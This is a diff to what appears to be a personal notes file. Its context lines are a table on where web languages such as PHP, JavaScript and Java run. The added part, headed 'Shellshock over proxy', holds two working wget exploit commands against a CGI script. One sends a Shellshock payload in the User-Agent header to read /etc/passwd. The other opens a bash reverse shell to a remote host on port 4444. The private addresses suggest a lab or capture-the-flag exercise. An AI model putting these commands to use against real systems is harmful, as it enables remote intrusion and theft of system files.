@@ -35,3 +35,9 @@ PHP, ColdFusion, ASP	  |	Embedded in the HTML document.	    |	On the server.
 Javascript	            |	Embedded in the HTML document.	    |	On the user's PC by their browser. 
 Java	                  |	In files on the server.           	|	On the user's PC by their browser. 
 
+
+Shellshock over proxy:
+
+wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" -e use_proxy=on -e http_proxy=10.0.2.4:3128 "http://127.0.0.1/cgi-bin/status"
+
+wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/bash -i >& /dev/tcp/10.0.2.15/4444 0>&1" -e use_proxy=on -e http_proxy=10.0.2.4:3128 "http://127.0.0.1/cgi-bin/status"
